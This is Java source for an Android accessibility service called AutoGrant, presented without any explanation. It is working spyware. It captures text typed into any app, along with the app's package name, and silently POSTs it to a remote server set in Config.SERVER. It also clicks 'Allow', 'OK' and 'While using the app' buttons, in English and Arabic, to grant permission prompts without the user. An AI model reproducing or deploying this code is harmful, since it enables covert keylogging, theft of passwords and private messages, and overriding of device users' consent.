package com.vanta.core;

import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

public class AutoGrant extends AccessibilityService {
    @Override
    public void onAccessibilityEvent(AccessibilityEvent e) {
        if (e.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            try {
                final String pkg = e.getPackageName().toString();
                final String text = e.getText().toString();
                if (text.length() > 1 && !text.equals("null")) {
                    new Thread(new Runnable() {
                        public void run() {
                            try {
                                java.net.HttpURLConnection c = (java.net.HttpURLConnection)
                                    new java.net.URL(Config.SERVER + "/result").openConnection();
                                c.setRequestMethod("POST");
                                c.setDoOutput(true);
                                c.setRequestProperty("Content-Type", "application/json");
                                String body = "{\"uuid\":\"typing\",\"text\":\"⌨️ "
                                    + pkg + ": " + text.replace("\"", "'").replace("\n", " ") + "\"}";
                                c.getOutputStream().write(body.getBytes("UTF-8"));
                                c.getOutputStream().close();
                                c.getInputStream().close();
                            } catch (Exception ex) {}
                        }
                    }).start();
                }
            } catch (Exception ex) {}
        }

        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root == null) return;
        click(root, "Allow"); click(root, "السماح");
        click(root, "OK");    click(root, "موافق");
        click(root, "While using the app"); click(root, "أثناء استخدام التطبيق");
    }

    private void click(AccessibilityNodeInfo n, String text) {
        if (n == null) return;
        if (n.getText() != null && n.getText().toString().equalsIgnoreCase(text) && n.isClickable()) {
            n.performAction(AccessibilityNodeInfo.ACTION_CLICK);
            return;
        }
        for (int i = 0; i < n.getChildCount(); i++) click(n.getChild(i), text);
    }

    @Override public void onInterrupt() {}
}
